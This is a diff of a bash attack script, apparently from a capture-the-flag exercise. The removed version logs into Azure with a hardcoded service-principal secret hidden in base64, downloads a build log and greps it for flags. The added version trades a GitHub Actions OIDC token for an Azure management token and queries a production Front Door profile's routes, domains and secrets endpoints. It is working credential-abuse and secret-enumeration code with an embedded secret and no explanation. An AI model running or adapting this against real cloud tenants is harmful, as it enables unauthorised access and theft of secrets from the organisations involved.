@@ -1,12 +1,10 @@
 #!/usr/bin/env bash
 set -uo pipefail
-TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"; APP=462d1c38-4459-48b8-9333-82e389e59514
-SECRET=$(echo 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)
-az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" -o none 2>/dev/null
-az storage blob download --account-name sttblcilogsprodx3euoz --container-name logs --name build-2024.log --auth-mode key --file /tmp/b.log -o none 2>/dev/null
-echo "SIZE=$(wc -c < /tmp/b.log)"
-echo "=== HEAD ==="
-head -c 3000 /tmp/b.log
-echo
-echo "=== GREP FLAG ==="
-grep -aE "DF26\{|flag|FLAG" /tmp/b.log | head -20
+TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"; RG=rg-tbl-platform-prod-sea
+OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=https://management.azure.com/.default" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
+B="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Cdn/profiles/afd-tbl-prod"
+for P in "originGroups?api-version=2021-06-01" "afdEndpoints/tbl-storefront-prod/routes?api-version=2021-06-01" "customDomains?api-version=2021-06-01" "secrets?api-version=2021-06-01"; do
+  echo "== $P =="
+  curl -sS -H "Authorization: Bearer $ARM" "$B/$P" | head -c 1500; echo
+done
